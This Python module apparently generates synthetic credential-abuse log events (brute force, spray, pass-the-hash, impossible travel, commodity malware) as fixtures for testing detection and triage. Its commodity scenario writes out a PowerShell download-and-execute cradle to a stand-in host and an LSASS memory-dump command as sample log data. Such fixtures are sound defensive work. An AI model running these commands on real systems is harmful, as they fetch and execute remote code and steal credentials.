"""Synthetic credential-abuse event builders.

Each builder returns a ``Bundle`` describing one adversary: its on-disk subdir,
incident id, ``source_class``, the ATT&CK ttps it covers, its narrative facts,
and an ordered list of ``(event, role)`` pairs. Event order is the fixture line
order the ground-truth references.

Events carry Sysmon-style tags (``_stream``/``_log``/``_stage``/``_technique``)
and a ``UtcTime`` clock (``"YYYY-MM-DD HH:MM:SS.fff"``) so the injector both
rebases them and ingests them without a parser change. Victim-side identity is
always the capture identity; attacker IPs are synthetic.
"""
from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timedelta

# --- shared identity / constants ------------------------------------------
# The single capture identity the injector remaps onto the real target host.
CAP_NAME = "WS-FIN-014"
CAP_FQDN = "ws-fin-014.corp.example"
CAP_IP = "10.10.4.37"
# Domain SID base (matches the EF benign windows-security substrate).
_SID = "S-1-5-21-1019202591-3223445781-1795416643"
_TS_FMT = "%Y-%m-%d %H:%M:%S.%f"


def _t(dt: datetime) -> str:
    """Sysmon UtcTime string, millisecond precision."""
    return dt.strftime(_TS_FMT)[:-3]


Event = dict
Bundle = "BundleSpec"


@dataclass(frozen=True)
class BundleSpec:
    subdir: str
    incident_id: str
    source_class: str          # apt | cybercrime | benign-anomaly
    ttps: list[str]
    notes: str
    narrative_facts: list[str]
    events: list[tuple[Event, str]]   # (event, role) in fixture-line order


# --- per-source event factories ------------------------------------------

def _winsec(event_id: int, utc: datetime, stage: str, tech: str, **fields: object) -> Event:
    ev: Event = {
        "_stream": "winsec", "_log": "security", "_stage": stage, "_technique": tech,
        "Provider": "Microsoft-Windows-Security-Auditing", "Channel": "Security",
        "EventID": event_id, "Computer": CAP_FQDN, "UtcTime": _t(utc),
    }
    ev.update(fields)
    return ev


def _syslog(utc: datetime, pid: int, message: str, tech: str = "T1110.001") -> Event:
    raw = f"{utc.strftime('%b %d %H:%M:%S')} {CAP_NAME} sshd[{pid}]: {message}"
    return {
        "_stream": "linux", "_log": "syslog", "_stage": "credential-access", "_technique": tech,
        "UtcTime": _t(utc), "host": CAP_FQDN, "process": "sshd", "pid": pid,
        "message": message, "raw": raw,
    }


def _wazuh(utc: datetime, stage: str, tech: str, rule: dict, data: dict) -> Event:
    return {
        "_stream": "wazuh", "_log": "alerts", "_stage": stage, "_technique": tech,
        "UtcTime": _t(utc), "rule": rule,
        "agent": {"id": "003", "name": CAP_NAME, "ip": CAP_IP},
        "manager": {"name": "wazuh-manager"}, "data": data,
    }


def _suricata(utc: datetime, sport: int, dport: int, sig: str, sid: int) -> Event:
    return {
        "_stream": "suricata", "_log": "eve", "_stage": "command-and-control",
        "_technique": "T1071.001", "UtcTime": _t(utc), "event_type": "alert",
        "src_ip": CAP_IP, "src_port": sport, "dest_ip": "203.0.113.200",
        "dest_port": dport, "proto": "TCP",
        "alert": {"signature": sig, "signature_id": sid,
                  "category": "A Network Trojan was Detected", "severity": 1, "action": "allowed"},
    }


def _sysmon1(utc: datetime, stage: str, tech: str, image: str, cmdline: str,
             parent_image: str, parent_cmd: str, pid: int) -> Event:
    return {
        "_stream": "sysmon", "_log": "sysmon", "_stage": stage, "_technique": tech,
        "channel": "Microsoft-Windows-Sysmon/Operational", "event_id": 1,
        "Computer": CAP_FQDN, "UtcTime": _t(utc), "User": f"{CAP_NAME}\\Administrator",
        "IntegrityLevel": "High", "Image": image, "CommandLine": cmdline,
        "ParentImage": parent_image, "ParentCommandLine": parent_cmd, "ProcessId": str(pid),
    }


# --- the six adversaries ---------------------------------------------------

def build_bruteforce() -> BundleSpec:
    """SSH brute force against srv-app-01 from one external source: ~40 failed
    logons for a nonexistent user, then a success; Wazuh rule 5710 fires."""
    base = datetime(2026, 1, 5, 2, 0, 0)
    ip = "198.51.100.42"
    events: list[tuple[Event, str]] = []
    for i in range(40):
        utc = base + timedelta(seconds=7 * i)
        msg = f"Failed password for invalid user oracle from {ip} port {50000 + i} ssh2"
        events.append((_syslog(utc, 4400 + i, msg), "initial-access"))
    events.append((_syslog(base + timedelta(seconds=280), 4500,
                           f"Accepted password for svcops from {ip} port 50999 ssh2"), "initial-access"))
    events.append((_wazuh(base + timedelta(seconds=60), "credential-access", "T1110.001",
                          {"id": "5710", "level": 5,
                           "description": "sshd: Attempt to login using a non-existent user.",
                           "groups": ["syslog", "sshd", "authentication_failed", "invalid_login"]},
                          {"srcip": ip, "dstuser": "oracle"}), "other"))
    return BundleSpec(
        "cred_bruteforce", "ssh-bruteforce-01", "cybercrime", ["T1110.001"],
        "SSH brute-force against srv-app-01 from a single external source, ~40 failed logons for a "
        "nonexistent user then a successful login; Wazuh rule 5710 fires.",
        [("SSH brute-force against srv-app-01 from a single external source, ~40 failed logons for a "
          "nonexistent user then a successful login; Wazuh rule 5710 fires."),
         "Detect via the auth-log burst from one source IP and the Wazuh authentication_failed alerts."],
        events)


def build_spray() -> BundleSpec:
    """Low-and-slow password spray against dc-01: one source IP, one password
    across ~15 domain accounts (4625), plus Kerberos pre-auth failures (4771)."""
    base = datetime(2026, 1, 6, 3, 0, 0)
    ip = "10.10.0.199"
    accts = ["jsmith", "mchen", "rpatel", "kwong", "dlopez", "agarcia", "bkhan", "tmurphy",
             "nsilva", "ograham", "pwalsh", "vshah", "lreed", "cortiz", "ffoster"]
    events: list[tuple[Event, str]] = []
    for i, acct in enumerate(accts):
        utc = base + timedelta(minutes=11 * i)
        events.append((_winsec(4625, utc, "credential-access", "T1110.003",
                               SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                               SubjectLogonId="0x0", TargetUserName=acct, TargetDomainName="CORP",
                               TargetUserSid=f"{_SID}-{1400 + i}", Status="0xc000006d",
                               FailureReason="%%2313", SubStatus="0xc000006a", LogonType="3",
                               LogonProcessName="NtLmSsp", AuthenticationPackageName="NTLM",
                               WorkstationName="WORKSTATION", IpAddress=ip, IpPort=str(50000 + i)),
                       "initial-access"))
    # Three Kerberos pre-auth failures late in the window, same source.
    for j, acct in enumerate(accts[:3]):
        utc = datetime(2026, 1, 6, 5, 45, 0) + timedelta(minutes=5 * j)
        events.append((_winsec(4771, utc, "credential-access", "T1110.003",
                               SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                               SubjectLogonId="0x0", TargetUserName=acct, Status="0x18",
                               TicketOptions="0x40810010", IpAddress=ip, PreAuthType="2"),
                       "initial-access"))
    return BundleSpec(
        "cred_spray", "pw-spray-01", "cybercrime", ["T1110.003"],
        "Low-and-slow password spray against dc-01: one source IP attempts a single password across ~15 "
        "domain accounts, plus Kerberos pre-auth failures.",
        [("Low-and-slow password spray against dc-01: one source IP attempts a single password across ~15 "
          "domain accounts, plus Kerberos pre-auth failures."),
         "Detect via one source hitting many distinct TargetUserName with 4625/4771, low per-account count."],
        events)


def build_dormant() -> BundleSpec:
    """Service account svc_backup normally logs on only as a nightly batch job
    (LogonType 4); here it performs an off-hours interactive logon (LogonType 10)."""
    sid = f"{_SID}-1180"
    events: list[tuple[Event, str]] = []
    for d in range(5):  # nightly batch baseline, 01-05 .. 01-09 at 01:05
        utc = datetime(2026, 1, 5, 1, 5, 0) + timedelta(days=d)
        events.append((_winsec(4624, utc, "baseline", "T1078.002",
                               SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                               SubjectLogonId="0x0", TargetUserName="svc_backup", TargetDomainName="CORP",
                               TargetUserSid=sid, LogonType="4", LogonProcessName="Advapi",
                               AuthenticationPackageName="Negotiate", WorkstationName="-",
                               IpAddress="-", IpPort="-"), "other"))
    events.append((_winsec(4624, datetime(2026, 1, 10, 3, 37, 0), "credential-access", "T1078.002",
                          SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                          SubjectLogonId="0x0", TargetUserName="svc_backup", TargetDomainName="CORP",
                          TargetUserSid=sid, LogonType="10", LogonProcessName="User32",
                          AuthenticationPackageName="Negotiate", WorkstationName="WKST-DEV",
                          IpAddress="10.10.0.88", IpPort="53122"), "initial-access"))
    return BundleSpec(
        "cred_dormant", "dormant-cred-01", "benign-anomaly", ["T1078.002"],
        "Service account svc_backup normally logs on only as a nightly batch job (LogonType 4); here it "
        "performs an off-hours RemoteInteractive logon (LogonType 10) from an unusual host.",
        [("Service account svc_backup normally logs on only as a nightly batch job (LogonType 4); here it "
          "performs an off-hours RemoteInteractive logon (LogonType 10) from an unusual host."),
         ("Detect via the off-baseline interactive logon for a service account that otherwise only runs "
          "scheduled.")],
        events)


def build_pth() -> BundleSpec:
    """Pass-the-hash into srv-files-01: a Type-3 NTLM network logon for the
    privileged corp-admin account from an unexpected source (wkst-11), then
    special-privilege assignment."""
    base = datetime(2026, 1, 9, 14, 0, 0)
    sid = f"{_SID}-1351"
    events = [
        (_winsec(4624, base, "lateral-movement", "T1550.002",
                 SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                 SubjectLogonId="0x0", TargetUserName="corp-admin", TargetDomainName="CORP",
                 TargetUserSid=sid, LogonType="3", LogonProcessName="NtLmSsp",
                 AuthenticationPackageName="NTLM", WorkstationName="WKST-11", IpAddress="10.10.0.21",
                 IpPort="49751", LmPackageName="NTLM V2", KeyLength="128"), "lateral"),
        (_winsec(4776, base + timedelta(seconds=1), "lateral-movement", "T1550.002",
                 SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                 SubjectLogonId="0x0", TargetUserName="corp-admin", Workstation="WKST-11",
                 Status="0x0", PackageName="MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"), "lateral"),
        (_winsec(4672, base + timedelta(seconds=2), "lateral-movement", "T1550.002",
                 SubjectUserName="corp-admin", SubjectDomainName="CORP", SubjectUserSid=sid,
                 SubjectLogonId="0x0",
                 PrivilegeList="SeDebugPrivilege SeTcbPrivilege SeBackupPrivilege"), "lateral"),
    ]
    return BundleSpec(
        "cred_pth", "pass-the-hash-01", "cybercrime", ["T1550.002"],
        "Pass-the-hash into srv-files-01: a Type-3 NTLM network logon for the privileged corp-admin "
        "account from an unexpected source host (wkst-11), followed by special-privilege assignment.",
        [("Pass-the-hash into srv-files-01: a Type-3 NTLM network logon for the privileged corp-admin "
          "account from an unexpected source host (wkst-11), followed by special-privilege assignment."),
         ("Detect via NTLM network logon (LogonType 3, NtLmSsp) for a privileged account from an unusual "
          "source IP.")],
        events)


def build_travel() -> BundleSpec:
    """Impossible travel for user ekim: two successful logons from geographically
    distant external IPs (203.0.113.50 then 198.51.100.77) within 35 minutes."""
    sid = f"{_SID}-1207"
    events = [
        (_winsec(4624, datetime(2026, 1, 7, 9, 0, 0), "baseline", "T1078",
                 SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                 SubjectLogonId="0x0", TargetUserName="ekim", TargetDomainName="CORP",
                 TargetUserSid=sid, LogonType="10", LogonProcessName="User32",
                 AuthenticationPackageName="Negotiate", WorkstationName="VPN-GW",
                 IpAddress="203.0.113.50", IpPort="51001"), "other"),
        (_winsec(4624, datetime(2026, 1, 7, 9, 35, 0), "credential-access", "T1078",
                 SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                 SubjectLogonId="0x0", TargetUserName="ekim", TargetDomainName="CORP",
                 TargetUserSid=sid, LogonType="10", LogonProcessName="User32",
                 AuthenticationPackageName="Negotiate", WorkstationName="VPN-GW",
                 IpAddress="198.51.100.77", IpPort="52777"), "initial-access"),
        (_winsec(4624, datetime(2026, 1, 7, 9, 40, 0), "credential-access", "T1078",
                 SubjectUserName="-", SubjectDomainName="-", SubjectUserSid="S-1-0-0",
                 SubjectLogonId="0x0", TargetUserName="ekim", TargetDomainName="CORP",
                 TargetUserSid=sid, LogonType="3", LogonProcessName="Kerberos",
                 AuthenticationPackageName="Kerberos", WorkstationName="-",
                 IpAddress="198.51.100.77", IpPort="52801"), "initial-access"),
    ]
    return BundleSpec(
        "cred_travel", "impossible-travel-01", "benign-anomaly", ["T1078"],
        "Impossible travel for user ekim: two successful logons from geographically distant external IPs "
        "(203.0.113.50 then 198.51.100.77) within 35 minutes.",
        [("Impossible travel for user ekim: two successful logons from geographically distant external IPs "
          "(203.0.113.50 then 198.51.100.77) within 35 minutes."),
         ("Detect via one account authenticating from two far-apart source IPs in a window too short to "
          "travel.")],
        events)


def build_commodity() -> BundleSpec:
    """Noisy commodity infection on wkst-11: encoded PowerShell loader + download
    cradle, comsvcs LSASS dump, and loud beaconing that trips ET MALWARE Suricata
    signatures (the true-positive alerts for triage). Deliberately LOUD — the
    opposite of the stealthy APT; NOT part of the APT-vs-cybercrime pair."""
    base = datetime(2026, 1, 8, 11, 0, 0)
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    events = [
        (_sysmon1(base, "execution", "T1059.001", ps,
                  '"powershell.exe" -NoP -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A...',
                  "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", 1001), "execution"),
        (_sysmon1(base + timedelta(seconds=8), "execution", "T1059.001", ps,
                  '"powershell.exe" IEX (New-Object Net.WebClient).DownloadString(\'http://203.0.113.200/a\')',
                  ps, '"powershell.exe" -NoP -W Hidden -Enc ...', 1002), "execution"),
        (_sysmon1(base + timedelta(seconds=30), "credential-access", "T1003.001",
                  "C:\\Windows\\System32\\rundll32.exe",
                  "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Users\\Public\\lsass.dmp full",
                  ps, '"powershell.exe" IEX ...', 1003), "other"),
        (_suricata(base + timedelta(minutes=5), 49000, 443,
                   "ET MALWARE Cobalt Strike Beacon (HTTP) Activity", 2028000), "c2"),
        (_suricata(base + timedelta(minutes=22), 49001, 443,
                   "ET MALWARE Cobalt Strike Malleable C2 Profile URI", 2028001), "c2"),
        (_suricata(base + timedelta(minutes=39), 49002, 80,
                   "ET MALWARE IcedID Loader Checkin", 2028002), "c2"),
        (_wazuh(base + timedelta(seconds=35), "credential-access", "T1003.001",
                {"id": "100002", "level": 12,
                 "description": "Mimikatz/LSASS memory access detected (comsvcs MiniDump).",
                 "groups": ["windows", "sysmon", "credential_access"]},
                {"srcip": "-", "dstuser": "corp-admin"}), "other"),
    ]
    return BundleSpec(
        "commodity", "commodity-01", "cybercrime", ["T1059.001", "T1003.001", "T1071.001"],
        "Noisy commodity infection on wkst-11: encoded PowerShell loader + download cradle, comsvcs LSASS "
        "dump, and loud beaconing to a known-bad C2 that trips ET MALWARE Suricata signatures (the "
        "true-positive alerts for triage).",
        [("Noisy commodity infection on wkst-11: encoded PowerShell loader + download cradle, comsvcs LSASS "
          "dump, and loud beaconing to a known-bad C2 that trips ET MALWARE Suricata signatures (the "
          "true-positive alerts for triage)."),
         ("This host is deliberately LOUD (network IDS alerts fire) — the opposite of the stealthy APT; it "
          "is NOT part of the APT-vs-cybercrime discrimination pair.")],
        events)


# Registry: incident_id -> builder. Order matches _DEFAULT_ADVERSARIES["L"].
BUILDERS = {
    "ssh-bruteforce-01": build_bruteforce,
    "pw-spray-01": build_spray,
    "dormant-cred-01": build_dormant,
    "pass-the-hash-01": build_pth,
    "impossible-travel-01": build_travel,
    "commodity-01": build_commodity,
}
